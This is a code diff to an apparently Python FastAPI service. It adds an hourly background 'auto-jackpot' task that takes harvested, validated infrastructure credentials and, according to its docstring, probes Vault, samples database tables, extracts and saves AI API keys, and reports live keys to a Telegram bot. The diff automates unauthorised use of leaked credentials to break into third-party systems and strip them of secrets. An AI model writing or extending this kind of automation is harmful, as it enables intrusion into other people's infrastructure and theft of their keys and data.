@@ -163,6 +163,39 @@ async def _themer_loop():
         await asyncio.sleep(8 * 3600)   # 8h
 
 
+async def _auto_jackpot_loop():
+    """Auto-jackpot probe — every 1h, picks up to 30 unprobed
+    is_validated=1 rows and runs the full jackpot pipeline (Vault probe +
+    table sample + AI-key extraction + validation + save_key + companion
+    score + new risk_level). Closes the gap where freshly-found infra
+    creds sat unprobed until someone manually triggered the endpoint.
+
+    No TG digest from this loop (would be too noisy 24×/day). Use
+    /admin/jackpot_status to inspect last result. Notify_found IS still
+    fired per discovered live key inside infra (high-signal).
+    """
+    # Wait 30 min after boot — let initial scans + validations complete
+    await asyncio.sleep(1800)
+    from infra_jackpot import run_jackpot_cycle
+    while True:
+        try:
+            unprobed = db.get_unprobed_validated_infra(limit=1)
+            if unprobed:
+                counters = await run_jackpot_cycle(limit=30, only_unprobed=True)
+                log.info("auto_jackpot tick: %s", {
+                    k: counters.get(k, 0) for k in (
+                        "total", "probed", "with_validated_keys",
+                        "saved_to_found_keys", "jackpot_critical",
+                        "total_estimated_exposure_usd",
+                    )
+                })
+            else:
+                log.debug("auto_jackpot: no unprobed validated rows")
+        except Exception as e:
+            log.error("auto_jackpot loop err: %s", e)
+        await asyncio.sleep(3600)   # 1h
+
+
 async def _vocab_expander_loop():
     """
     AI vocabulary expander (Layer 2) — runs every 24h.
@@ -231,6 +264,7 @@ async def lifespan(app: FastAPI):
         asyncio.create_task(_query_rotation_loop(), name="query_rotation"),
         asyncio.create_task(_themer_loop(),         name="query_themer"),
         asyncio.create_task(_vocab_expander_loop(), name="vocab_expander"),
+        asyncio.create_task(_auto_jackpot_loop(),   name="auto_jackpot"),
         asyncio.create_task(bot_loop(),             name="tg_bot"),
     ]
     yield
